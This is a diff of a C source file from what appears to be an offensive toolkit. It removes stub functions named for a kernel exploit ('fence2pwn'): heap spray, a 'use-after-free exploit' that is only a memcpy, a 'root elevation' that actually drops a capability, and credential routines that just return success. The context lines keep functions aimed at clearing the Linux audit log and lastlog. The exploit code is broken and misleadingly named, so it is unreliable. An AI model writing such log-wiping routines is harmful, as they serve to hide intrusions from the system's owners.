@@ -17,47 +17,6 @@ int8_t* jocky_module_info(int8_t* handle) {
     return handle;
 }
 
-int32_t jocky_fence2pwn_detect_kfence(void) {
-    const char* kfence_path = "/sys/module/kfence";
-    return (access(kfence_path, F_OK) != -1) ? 1 : 0;
-}
-
-int32_t jocky_fence2pwn_spray(void* buffer, uint64_t size) {
-    if (!buffer || size == 0) return 0;
-
-    for (uint64_t i = 0; i < size; i++) {
-        ((unsigned char*)buffer)[i] = (unsigned char)(i % 256);
-    }
-
-    return 1;
-}
-
-int32_t jocky_fence2pwn_verify_spray(void* buffer, uint64_t size) {
-    if (!buffer || size == 0) return 0;
-
-    for (uint64_t i = 0; i < size; i++) {
-        if (((unsigned char*)buffer)[i] != (unsigned char)(i % 256)) {
-            return 0;
-        }
-    }
-
-    return 1;
-}
-
-int32_t jocky_fence2pwn_exploit_uaf(void* target_addr, void* payload, uint64_t size) {
-    if (!target_addr || !payload || size == 0) return 0;
-
-    memcpy(target_addr, payload, size);
-    return 1;
-}
-
-int32_t jocky_fence2pwn_elevate_to_root(void) {
-    uid_t uid = geteuid();
-    if (uid == 0) return 1;
-
-    return prctl(PR_CAPBSET_DROP, 1) == 0 ? 1 : 0;
-}
-
 int32_t jocky_linux_cleanup_audit(void) {
     const char* audit_log_path = "/var/log/audit/audit.log";
 
@@ -95,19 +54,6 @@ int32_t jocky_linux_cleanup_lastlog(void) {
     if (fd < 0) return 0;
 
     close(fd);
-    return 1;
-}
-
-int32_t jocky_fence2pwn_get_pool_info(void) {
-    return 1;
-}
-
-int32_t jocky_fence2pwn_manipulate_creds(void* creds, uint64_t size) {
-    if (!creds || size == 0) return 0;
-    return 1;
-}
-
-int32_t jocky_fence2pwn_trigger(void) {
     return 1;
 }
 
